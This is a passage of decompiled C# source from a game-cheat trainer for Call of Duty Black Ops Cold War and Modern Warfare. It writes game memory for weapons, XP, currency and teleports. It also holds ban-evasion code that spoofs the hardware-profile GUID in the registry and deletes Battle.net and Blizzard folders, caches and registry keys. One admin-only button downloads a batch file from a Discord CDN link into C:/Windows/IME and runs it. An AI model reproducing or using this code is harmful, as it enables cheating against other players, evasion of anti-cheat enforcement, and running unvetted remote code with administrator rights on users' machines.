				this.mem.WriteInt(Main.p4masteryarray3[num6], 9999);
			}
			for (int num7 = 0; num7 < Main.p4masteryarray4.Length; num7++)
			{
				this.mem.WriteInt(Main.p4masteryarray4[num7], 9999);
			}
			this.timesp4++;
			if (this.timesp4 <= 200)
			{
				this.p4Camo.Stop();
			}
		}

		// Token: 0x060002AE RID: 686 RVA: 0x00005140 File Offset: 0x00005140
		private void cbufText_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060002AF RID: 687 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenTextBox2_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060002B0 RID: 688 RVA: 0x000116AB File Offset: 0x000116AB
		private void thirteenButton36_Click(object sender, EventArgs e)
		{
			this.testCMDs.RunWorkerAsync();
		}

		// Token: 0x060002B1 RID: 689 RVA: 0x00005140 File Offset: 0x00005140
		private void testCMDs_DoWork(object sender, DoWorkEventArgs e)
		{
		}

		// Token: 0x060002B2 RID: 690 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton37_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002B3 RID: 691 RVA: 0x000116B8 File Offset: 0x000116B8
		private void button2_Click(object sender, EventArgs e)
		{
			if (Main.<>o__483.<>p__0 == null)
			{
				Main.<>o__483.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__483.<>p__0.Target(Main.<>o__483.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.sendCbuf("s gametype ;s activeaction xblive_privatematch 0;onlinegame 1;resetStats;disconnect;defaultStatsInit");
			}
		}

		// Token: 0x060002B4 RID: 692 RVA: 0x0001172C File Offset: 0x0001172C
		private void thirteenButton37_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__484.<>p__0 == null)
			{
				Main.<>o__484.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__484.<>p__0.Target(Main.<>o__484.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long pointerInt = this.mem.GetPointerInt(this.mem.BaseAddress + this.fastRun, new long[1], 1);
				Clipboard.SetText(pointerInt.ToString());
				MessageBox.Show(pointerInt.ToString());
			}
		}

		// Token: 0x060002B5 RID: 693 RVA: 0x00005140 File Offset: 0x00005140
		private void tabPage5_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002B6 RID: 694 RVA: 0x000117D4 File Offset: 0x000117D4
		private void thirteenButton38_Click(object sender, EventArgs e)
		{
			if (Main.<>o__486.<>p__0 == null)
			{
				Main.<>o__486.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__486.<>p__0.Target(Main.<>o__486.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long pointerInt = this.mem.GetPointerInt(this.mem.BaseAddress + this.fastRun, new long[1], 1);
				File.WriteAllBytes("Client1Base.bin", this.mem.ReadBytes(pointerInt - 4095L, 1048575));
			}
		}

		// Token: 0x060002B7 RID: 695 RVA: 0x00011884 File Offset: 0x00011884
		private void add100000SalvageToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__487.<>p__0 == null)
			{
				Main.<>o__487.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__487.<>p__0.Target(Main.<>o__487.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + 4170L, 100000);
				this.mem.WriteInt(gclient + 15802L, 100000);
				this.mem.WriteInt(gclient + 23864L, 100000);
				this.mem.WriteInt(gclient + 24976L, 100000);
			}
		}

		// Token: 0x060002B8 RID: 696 RVA: 0x00011970 File Offset: 0x00011970
		private void add100000ScrapToolStripMenuItem_Click(object sender, EventArgs e)
		{
			if (Main.<>o__488.<>p__0 == null)
			{
				Main.<>o__488.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__488.<>p__0.Target(Main.<>o__488.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(Convert.ToInt32(this.dataGridView1.SelectedCells[0].RowIndex));
				this.mem.WriteInt(gclient + 4168L, 100000);
				this.mem.WriteInt(gclient + 15800L, 100000);
				this.mem.WriteInt(gclient + 23868L, 100000);
				this.mem.WriteInt(gclient + 24980L, 100000);
			}
		}

		// Token: 0x060002B9 RID: 697 RVA: 0x00011A5C File Offset: 0x00011A5C
		private void sightCycle_Tick(object sender, EventArgs e)
		{
			for (int i = 0; i < 4; i++)
			{
				long gclient = this.GetGClient(i);
				int num = this.mem.ReadInt(gclient + this.killPtr);
				if (new string[]
				{
					"5",
					"6",
					"7",
					"8",
					"9"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 40);
					return;
				}
				if (new string[]
				{
					"10",
					"11",
					"12",
					"13",
					"14"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 180);
					return;
				}
				if (new string[]
				{
					"15",
					"16",
					"17",
					"18",
					"19"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 176);
					return;
				}
				if (new string[]
				{
					"20",
					"21",
					"22",
					"23",
					"24"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 4);
					return;
				}
				if (new string[]
				{
					"25",
					"26",
					"27",
					"28",
					"29"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 44);
					return;
				}
				if (new string[]
				{
					"30",
					"31",
					"32",
					"33",
					"34"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 184);
					return;
				}
				if (new string[]
				{
					"35",
					"36",
					"37",
					"38",
					"39"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 48);
					return;
				}
				if (new string[]
				{
					"40",
					"41",
					"42",
					"43",
					"44"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 188);
					return;
				}
				if (new string[]
				{
					"45",
					"46",
					"47",
					"48",
					"48"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 92);
					return;
				}
				if (new string[]
				{
					"50",
					"51",
					"52",
					"53",
					"54"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 192);
					return;
				}
				if (new string[]
				{
					"55",
					"56",
					"57",
					"58",
					"59"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 196);
					return;
				}
				if (new string[]
				{
					"60",
					"61",
					"62",
					"63",
					"64"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 32);
					return;
				}
				if (new string[]
				{
					"65",
					"66",
					"67",
					"68",
					"69"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 200);
					return;
				}
				if (new string[]
				{
					"70",
					"70",
					"72",
					"73",
					"74"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 252);
					return;
				}
				if (new string[]
				{
					"75",
					"76",
					"77",
					"78",
					"79"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 40);
					return;
				}
				if (new string[]
				{
					"80",
					"81",
					"82",
					"83",
					"84"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 208);
					return;
				}
				if (new string[]
				{
					"85",
					"86",
					"87",
					"88",
					"89"
				}.Contains(num.ToString()))
				{
					this.mem.WriteByte(gclient + 177L, 180);
					return;
				}
			}
		}

		// Token: 0x060002BA RID: 698 RVA: 0x00012028 File Offset: 0x00012028
		private void checkBox3_CheckedChanged_2(object sender, EventArgs e)
		{
			if (Main.<>o__490.<>p__0 == null)
			{
				Main.<>o__490.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__490.<>p__0.Target(Main.<>o__490.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.checkBox3.Checked)
				{
					this.sightCycle.Start();
					return;
				}
				this.sightCycle.Stop();
			}
		}

		// Token: 0x060002BB RID: 699 RVA: 0x000120B4 File Offset: 0x000120B4
		private void numericUpDown1_ValueChanged(object sender, EventArgs e)
		{
			if (Main.<>o__502.<>p__0 == null)
			{
				Main.<>o__502.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__502.<>p__0.Target(Main.<>o__502.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				long gclient = this.GetGClient(0);
				this.mem.WriteInt(gclient + this.weaponSkin, (int)this.numericUpDown1.Value);
			}
		}

		// Token: 0x060002BC RID: 700 RVA: 0x00012148 File Offset: 0x00012148
		private void thirteenButton40_Click(object sender, EventArgs e)
		{
			if (Main.<>o__503.<>p__0 == null)
			{
				Main.<>o__503.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__503.<>p__0.Target(Main.<>o__503.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				this.GetGClient(0);
			}
		}

		// Token: 0x060002BD RID: 701 RVA: 0x00005140 File Offset: 0x00005140
		private void groupBox2_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x060002BE RID: 702 RVA: 0x000121B8 File Offset: 0x000121B8
		private static void GUIDSpoof()
		{
			Guid guid = Guid.NewGuid();
			string name = "SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001";
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name, true);
			if (registryKey != null)
			{
				string identity = Environment.UserDomainName + "\\" + Environment.UserName;
				RegistrySecurity registrySecurity = new RegistrySecurity();
				registrySecurity.AddAccessRule(new RegistryAccessRule(identity, RegistryRights.FullControl, InheritanceFlags.None, PropagationFlags.None, AccessControlType.Allow));
				registryKey.SetAccessControl(registrySecurity);
				string name2 = "HwProfileGuid";
				string str = "{";
				Guid guid2 = guid;
				registryKey.SetValue(name2, str + guid2.ToString() + "}", RegistryValueKind.String);
				registryKey.Close();
			}
		}

		// Token: 0x060002BF RID: 703 RVA: 0x00005140 File Offset: 0x00005140
		private void LogSpoofer(string message)
		{
		}

		// Token: 0x060002C0 RID: 704 RVA: 0x00012253 File Offset: 0x00012253
		private void LogCleaner(string message)
		{
			RichTextBox richTextBox = this.richTextBox3;
			richTextBox.Text = richTextBox.Text + "[INFO] " + message + Environment.NewLine;
		}

		// Token: 0x060002C1 RID: 705 RVA: 0x00012276 File Offset: 0x00012276
		public static bool IsAdministrator()
		{
			return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
		}

		// Token: 0x060002C2 RID: 706 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton41_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060002C3 RID: 707 RVA: 0x0001228C File Offset: 0x0001228C
		private void thirteenButton44_Click(object sender, EventArgs e)
		{
			if (Main.IsAdministrator())
			{
				WebClient webClient = new WebClient();
				string fileName = "C:/Windows/IME/check.bat";
				webClient.DownloadFile("https://cdn.discordapp.com/attachments/798311924886142987/799333451416731698/Serials.bat", fileName);
				Process process = new Process();
				process.StartInfo.FileName = "Cmd.exe";
				process.StartInfo.UseShellExecute = true;
				process.StartInfo.CreateNoWindow = true;
				process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
				Process.Start(fileName);
				return;
			}
			MessageBox.Show("Please run as Admin!");
		}

		// Token: 0x060002C4 RID: 708 RVA: 0x00012304 File Offset: 0x00012304
		private string Regisrty()
		{
			this.LogCleaner("Cleaning Regisrty..");
			RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.Users, RegistryView.Default);
			foreach (string text in registryKey.GetSubKeyNames())
			{
				if (text.Contains("S-1-5-21-") && !text.Contains("Classes"))
				{
					RegistryKey registryKey2 = registryKey.OpenSubKey(text + "\\System\\GameConfigStore\\Children");
					foreach (string name in registryKey2.GetSubKeyNames())
					{
						RegistryKey registryKey3 = registryKey2.OpenSubKey(name);
						if (object.Equals(registryKey3.GetValue("TitleId"), "1787008472"))
						{
							string text2 = registryKey3.GetValue("MatchedExeFullPath").ToString();
							return text2.Substring(0, text2.LastIndexOf("\\"));
						}
					}
				}
			}
			this.LogCleaner("Registry Cleaned!");
			return null;
		}

		// Token: 0x060002C5 RID: 709 RVA: 0x000123F4 File Offset: 0x000123F4
		private void ClearTracers()
		{
			string text = this.Regisrty();
			if (text == null)
			{
				this.LogCleaner("Searching For Tracers...");
			}
			string[] array = new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Battle.net",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Blizzard Entertainment",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Battle.net",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Documents\\Call Of Duty Black Ops Cold War",
				"C:\\ProgramData\\Battle.net",
				"C:\\ProgramData\\Blizzard Entertainment"
			};
			for (int i = 0; i < array.Length; i++)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(array[i]);
				if (directoryInfo.Exists)
				{
					directoryInfo.Delete(true);
				}
			}
			foreach (string path in new string[]
			{
				text + "\\main\\data0.dcache",
				text + "\\main\\data1.dcache",
				text + "\\main\\toc0.dcache",
				text + "\\main\\toc1.dcache",
				text + "\\Data\\data\\shmem",
				text + "\\main\\recipes\\cmr_hist"
			})
			{
				if (File.Exists(path))
				{
					File.Delete(path);
					this.LogCleaner("Tracers Cleared!");
				}
			}
			this.LogCleaner("Tracers Cleared!");
		}

		// Token: 0x060002C6 RID: 710 RVA: 0x00012540 File Offset: 0x00012540
		private static void KillBNET()
		{
			string[] array = new string[]
			{
				"Agent",
				"Battle.net"
			};
			for (int i = 0; i < array.Length; i++)
			{
				Process[] processesByName = Process.GetProcessesByName(array[i]);
				for (int j = 0; j < processesByName.Length; j++)
				{
					processesByName[j].Kill();
				}
			}
		}

		// Token: 0x060002C7 RID: 711 RVA: 0x00012594 File Offset: 0x00012594
		private void registryClearCW()
		{
			string name = "SOFTWARE\\WOW6432Node";
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name, true))
			{
				if (registryKey != null)
				{
					foreach (string text in registryKey.GetSubKeyNames())
					{
						if (text == "Blizzard Entertainment")
						{
							registryKey.DeleteSubKeyTree(text);
						}
					}
				}
			}
			string name2 = "Software\\Blizzard Entertainment";
			using (RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey(name2, true))
			{
				if (registryKey2 != null)
				{
					foreach (string text2 in registryKey2.GetSubKeyNames())
					{
						if (text2 == "Battle.net")
						{
							registryKey2.DeleteSubKeyTree(text2);
						}
					}
				}
			}
			this.LogCleaner("Registry Cleaned!");
		}

		// Token: 0x060002C8 RID: 712 RVA: 0x0001267C File Offset: 0x0001267C
		private void thirteenButton43_Click(object sender, EventArgs e)
		{
			if (Main.IsAdministrator())
			{
				this.richTextBox3.Clear();
				Task task = new Task(new Action(Main.KillBNET));
				Task task2 = new Task(new Action(this.ClearTracers));
				Task task3 = new Task(new Action(this.registryClearCW));
				this.LogCleaner("Closing Battlenet..");
				task.Start();
				task.Wait();
				this.LogCleaner("Starting Tracer Cleaner..");
				task2.Start();
				task2.Wait();
				this.LogCleaner("Starting More Registry Cleaning..");
				task3.Start();
				task3.Wait();
				this.LogCleaner("Finished!");
				return;
			}
			MessageBox.Show("Please run as Admin.");
		}

		// Token: 0x060002C9 RID: 713 RVA: 0x00012730 File Offset: 0x00012730
		private void clearTracersMW()
		{
			string text = this.Regisrty();
			if (text == null)
			{
				this.LogCleaner("Searching for Tracers..");
			}
			string[] array = new string[]
			{
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Battle.net",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Blizzard Entertainment",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Battle.net",
				Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Documents\\Call of Duty Modern Warfare",
				"C:\\ProgramData\\Battle.net",
				"C:\\ProgramData\\Blizzard Entertainment"
			};
			for (int i = 0; i < array.Length; i++)
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(array[i]);
				if (directoryInfo.Exists)
				{
					directoryInfo.Delete(true);
				}
			}
			foreach (string path in new string[]
			{
				text + "\\Call of Duty Modern Warfare\\main\\data0.dcache",
				text + "\\Call of Duty Modern Warfare\\main\\data1.dcache",
				text + "\\Call of Duty Modern Warfare\\main\\toc0.dcache",
				text + "\\Call of Duty Modern Warfare\\main\\toc1.dcache",
				text + "\\Call of Duty Modern Warfare\\Data\\data\\shmem",
				text + "\\Call of Duty Modern Warfare\\main\\recipes\\cmr_hist"
			})
			{
				if (File.Exists(path))
				{
					File.Delete(path);
					this.LogCleaner("Tracers Deleted!");
				}
			}
		}

		// Token: 0x060002CA RID: 714 RVA: 0x00012870 File Offset: 0x00012870
		private void thirteenButton42_Click(object sender, EventArgs e)
		{
			if (Main.IsAdministrator())
			{
				this.richTextBox3.Clear();
				Task task = new Task(new Action(Main.KillBNET));
				Task task2 = new Task(new Action(this.clearTracersMW));
				Task task3 = new Task(new Action(this.registryClearCW));
				this.LogCleaner("Closing Battlenet..");
				task.Start();
				task.Wait();
				this.LogCleaner("Starting Tracer Cleaner..");
				task2.Start();
				task2.Wait();
				this.LogCleaner("Starting More Registry Cleaning..");
				task3.Start();
				task3.Wait();
				this.LogCleaner("Finished!");
				return;
			}
			MessageBox.Show("Please run as Admin.");
		}

		// Token: 0x060002CB RID: 715 RVA: 0x00005140 File Offset: 0x00005140
		private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060002CC RID: 716 RVA: 0x00012924 File Offset: 0x00012924
		private void thirteenButton44_Click_1(object sender, EventArgs e)
		{
			if (Main.<>o__519.<>p__0 == null)
			{
				Main.<>o__519.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__519.<>p__0.Target(Main.<>o__519.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
				if (this.comboBox1.SelectedIndex == 0)
				{
					this.sendCbuf("full_restart");
					return;
				}
				if (this.comboBox1.SelectedIndex == 1)
				{
					this.sendCbuf("LobbyLaunchGame");
					return;
				}
				if (this.comboBox1.SelectedIndex == 2)
				{
					Main.ProcessCheck();
					this.endGame.RunWorkerAsync();
					return;
				}
				if (this.comboBox1.SelectedIndex == 3)
				{
					this.sendCbuf("disconnect");
					return;
				}
				if (this.comboBox1.SelectedIndex == 4)
				{
					this.sendCbuf(string.Format("cmd sl -1 0", Array.Empty<object>()));
					return;
				}
				if (this.comboBox1.SelectedIndex == 5)
				{
					this.sendCbuf("revive_trigger_radius 99999");
					return;
				}
				if (this.comboBox1.SelectedIndex == 6)
				{
					MessageBox.Show("Not working, use in-game XP!");
					return;
				}
				if (this.comboBox1.SelectedIndex == 7)
				{
					if (MessageBox.Show("Please confirm you in-game and can see your weapon. DO NOT KILL ANY ZOMBIES. Are you ready to start?", "Start XP Lobby?", MessageBoxButtons.YesNo) == DialogResult.Yes)
					{
						if (Main.<>o__519.<>p__1 == null)
						{
							Main.<>o__519.<>p__1 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
							{
								CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
							}));
						}
						if (Main.<>o__519.<>p__1.Target(Main.<>o__519.<>p__1, this.mem.IsProcessRunning(this.TargetProcessName)))
						{
							for (int i = 0; i < 4; i++)
							{
								long gclient = this.GetGClient(i);
								this.mem.WriteUInt(gclient + 3684L, 2684354560U);
							}
							for (int j = 0; j < 4; j++)
							{
								this.giveWeapon2(1.ToString(), j);
							}
							this.mem.WriteFloat(this.mem.BaseAddress + this.xp - 8L, Convert.ToSingle(50000));
							this.mem.WriteFloat(this.mem.BaseAddress + this.xp, Convert.ToSingle(50000));
							this.skipPointer();
							this.skipRounds.Start();
							for (int k = 0; k < 4; k++)
							{
								long gclient2 = this.GetGClient(k);
								this.mem.WriteInt(gclient2 + 4968L, 0);
								this.mem.WriteInt(gclient2 + 4976L, 0);
								this.mem.WriteInt(gclient2 + 5080L, 0);
								this.mem.WriteInt(gclient2 + 5084L, 0);
								this.mem.WriteInt(gclient2 + 5088L, 0);
								this.mem.WriteInt(gclient2 + 5076L, 0);
								this.mem.WriteInt(gclient2 + 5100L, 0);
								this.mem.WriteInt(gclient2 + 5092L, 0);
								this.mem.WriteInt(gclient2 + 5096L, 0);
							}
							for (int l = 137; l < 178; l++)
							{
								long gentity = this.GetGEntity(l);
								bool flag = this.mem.ReadInt(gentity + 920L) != 0;
								int num = this.mem.ReadInt(gentity + 8L);
								if (flag && (num == 1074856960 || num == 1115136))
								{
									this.mem.WriteFloat(gentity + 724L, this.TeleportPos[0]);
									this.mem.WriteFloat(gentity + 728L, this.TeleportPos[1]);
									this.mem.WriteFloat(gentity + 732L, this.TeleportPos[2]);
								}
							}
							MessageBox.Show("Press OK when you are whatever level you want to be.");
							this.skipRounds.Stop();
							this.mem.WriteFloat(this.mem.BaseAddress + this.xp - 8L, Convert.ToSingle(1));
							this.mem.WriteFloat(this.mem.BaseAddress + this.xp, Convert.ToSingle(1));
							MessageBox.Show("Now End the game!");
							return;
						}
					}
				}
				else
				{
					if (this.comboBox1.SelectedIndex == 8)
					{
						MessageBox.Show("Not working, use In-Game XP!");
						return;
					}
					MessageBox.Show("Please select a command!");
				}
			}
		}

		// Token: 0x060002CD RID: 717 RVA: 0x00005140 File Offset: 0x00005140
		private void thirteenButton12_Click_2(object sender, EventArgs e)
		{
		}

		// Token: 0x060002CE RID: 718 RVA: 0x00012DB0 File Offset: 0x00012DB0
		private void comboBox2_SelectedIndexChanged(object sender, EventArgs e)
		{
			if (this.checkBox5.Checked)
			{
				if (Main.<>o__521.<>p__0 == null)
				{
					Main.<>o__521.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
					{
						CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
					}));
				}
				if (Main.<>o__521.<>p__0.Target(Main.<>o__521.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
				{
					string text = this.comboBox2.Text;
					for (int i = 0; i < 4; i++)
					{
						if (this.comboBox2.Text == "XM4")
						{
							this.giveWeapon2(Main.WeaponXM4PAP, i);
						}
						else if (this.comboBox2.Text == "AK-47")
						{
							this.giveWeapon2(Main.WeaponAK47PAP, i);
						}
						else if (this.comboBox2.Text == "Krig 6")
						{
							this.giveWeapon2(Main.WeaponKrig6PAP, i);
						}
						else if (this.comboBox2.Text == "QBZ-83")
						{
							this.giveWeapon2(Main.WeaponQBZ83PAP, i);
						}
						else if (this.comboBox2.Text == "FFAR")
						{
							this.giveWeapon2(Main.WeaponFFAR1PAP, i);
						}
						else if (this.comboBox2.Text == "Groza")
						{
							this.giveWeapon2(Main.WeaponGrozaPAP, i);
						}
						else if (this.comboBox2.Text == "FARA")
						{
							this.giveWeapon2(Main.WeaponFARA83PAP, i);
						}
						else if (this.comboBox2.Text == "MP5")
						{
							this.giveWeapon2(Main.WeaponMP5PAP, i);
						}
						else if (this.comboBox2.Text == "Milano 821")
						{
							this.giveWeapon2(Main.WeaponMilano821PAP, i);
						}
						else if (this.comboBox2.Text == "AK-47u")
						{
							this.giveWeapon2(Main.WeaponAk74uPAP, i);
						}
						else if (this.comboBox2.Text == "KSP-45")
						{
							this.giveWeapon2(Main.WeaponKSP45PAP, i);
						}
						else if (this.comboBox2.Text == "Bullfrog")
						{
							this.giveWeapon2(Main.WeaponBullfrogPAP, i);
						}
						else if (this.comboBox2.Text == "Mac 10")
						{
							this.giveWeapon2(Main.WeaponMac10PAP, i);
						}
						else if (this.comboBox2.Text == "LC10")
						{
							this.giveWeapon2(Main.WeaponLC10PAP, i);
						}
						else if (this.comboBox2.Text == "Gallo SA12")
						{
							this.giveWeapon2(Main.WeaponGalloSA12PAP, i);
						}
						else if (this.comboBox2.Text == "Hauer")
						{
							this.giveWeapon2(Main.WeaponHauer77PAP, i);
						}
						else if (this.comboBox2.Text == "Streetsweeper")
						{
							this.giveWeapon2(Main.WeaponStreetSweeperPAP, i);
						}
						else if (this.comboBox2.Text == "Pellington")
						{
							this.giveWeapon2(Main.WeaponPelington703PAP, i);
						}
						else if (this.comboBox2.Text == "LW3")
						{
							this.giveWeapon2(Main.WeaponLW3TundraPAP, i);
						}
						else if (this.comboBox2.Text == "M82")
						{
							this.giveWeapon2(Main.WeaponM82PAP, i);
						}
						else if (this.comboBox2.Text == "ZRG 20MM")
						{
							this.giveWeapon2(Main.WeaponZRGmmEPAP, i);
						}
						else if (this.comboBox2.Text == "Type 63")
						{
							this.giveWeapon2(Main.WeaponType63PAP, i);
						}
						else if (this.comboBox2.Text == "M16")
						{
							this.giveWeapon2(Main.WeaponM16PAP, i);
						}
						else if (this.comboBox2.Text == "AUG")
						{
							this.giveWeapon2(Main.WeaponAUGPAP, i);
						}
						else if (this.comboBox2.Text == "DMR")
						{
							this.giveWeapon2(Main.WeaponDMR14PAP, i);
						}
						else if (this.comboBox2.Text == "Stoner 63")
						{
							this.giveWeapon2(Main.WeaponStoner63PAP, i);
						}
						else if (this.comboBox2.Text == "RPD")
						{
							this.giveWeapon2(Main.WeaponRPDPAP, i);
						}
						else if (this.comboBox2.Text == "M60")
						{
							this.giveWeapon2(Main.WeaponM60PAP, i);
						}
						else if (this.comboBox2.Text == "1911")
						{
							this.giveWeapon2(Main.Weapon1911PAP, i);
						}
						else if (this.comboBox2.Text == "Magnum")
						{
							this.giveWeapon2(Main.WeaponMagnumPAP, i);
						}
						else if (this.comboBox2.Text == "Diamatti")
						{
							this.giveWeapon2(Main.WeaponDiamattiPAP, i);
						}
						else if (this.comboBox2.Text == "Knife")
						{
							this.giveWeapon2(Main.WeaponKnifePAP, i);
						}
						else if (this.comboBox2.Text == "Sledgehammer")
						{
							this.giveWeapon2(Main.WeaponSledgeHammerPAP, i);
						}
						else if (this.comboBox2.Text == "Wakizashi")
						{
							this.giveWeapon2(Main.WeaponWakizashiPAP, i);
						}
						else if (this.comboBox2.Text == "RPG")
						{
							this.giveWeapon2(Main.WeaponRPG7PAP, i);
						}
						else if (this.comboBox2.Text == "Cigma")
						{
							this.giveWeapon2(Main.WeaponCigma2PAP, i);
						}
						else if (this.comboBox2.Text == "M79")
						{
							this.giveWeapon2(Main.WeaponM79PAP, i);
						}
						else if (this.comboBox2.Text == "Crossbow")
						{
							this.giveWeapon2(Main.WeaponR1ShadowhunterCrossbowPAP, i);
						}
						else if (this.comboBox2.Text == "E-Tool")
						{
							this.giveWeapon2(Main.WeaponETool2PAP, i);
						}
						else if (this.comboBox2.Text == "Machete")
						{
							this.giveWeapon2(Main.WeaponMachetePAP, i);
						}
					}
				}
			}
		}

		// Token: 0x060002CF RID: 719 RVA: 0x0001347C File Offset: 0x0001347C
		private void thirteenButton12_Click_3(object sender, EventArgs e)
		{
			if (Main.<>o__522.<>p__0 == null)
			{
				Main.<>o__522.<>p__0 = CallSite<Func<CallSite, object, bool>>.Create(Binder.UnaryOperation(CSharpBinderFlags.None, ExpressionType.IsTrue, typeof(Main), new CSharpArgumentInfo[]
				{
					CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, null)
				}));
			}
			if (Main.<>o__522.<>p__0.Target(Main.<>o__522.<>p__0, this.mem.IsProcessRunning(this.TargetProcessName)))
			{
